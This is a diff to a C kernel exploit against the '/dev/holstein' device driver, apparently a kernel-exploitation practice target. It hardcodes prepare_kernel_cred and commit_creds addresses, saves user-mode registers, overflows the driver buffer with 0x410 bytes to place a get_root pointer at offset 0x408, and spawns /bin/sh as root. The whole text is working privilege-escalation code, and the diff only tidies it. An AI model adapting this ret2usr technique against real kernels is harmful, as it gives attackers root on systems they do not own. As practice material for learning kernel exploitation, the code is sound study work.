@@ -1,14 +1,12 @@
 #include <fcntl.h>
-#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <unistd.h>
 
-static uint64_t cs;
-static uint64_t rflags;
-static uint64_t rsp;
-static uint64_t ss;
+void *cs;
+void *rflags;
+void *rsp;
+void *ss;
 
 void *(*prepare_kernel_cred)(void *)	= (void *)0xffffffff8106e240;
 int (*commit_creds)(void *)		= (void *)0xffffffff8106e390;
@@ -21,15 +19,13 @@ static void save_state(void)
 		     "movq %%rsp, %[rsp]\n\t"
 		     "movq %%ss, %[ss]"
 		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
-		       [ss] "=r"(ss)
-		     :);
+		       [ss] "=r"(ss));
 }
 
 static void shell(void)
 {
 	puts("[+] get r00t!");
-	char *argv[] = { "/bin/sh", NULL };
-	execve("/bin/sh", argv, NULL);
+	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
 }
 
 static void restore_state(void)
@@ -61,11 +57,10 @@ int main(void)
 
 	fd = open("/dev/holstein", O_RDWR);
 	if (fd == -1) {
-		perror("open");
+		perror("[-] open");
 		return EXIT_FAILURE;
 	}
 
-	memset(data, '1', 0x408);
 	*(void **)&data[0x408] = get_root;
 	write(fd, data, 0x410);
 
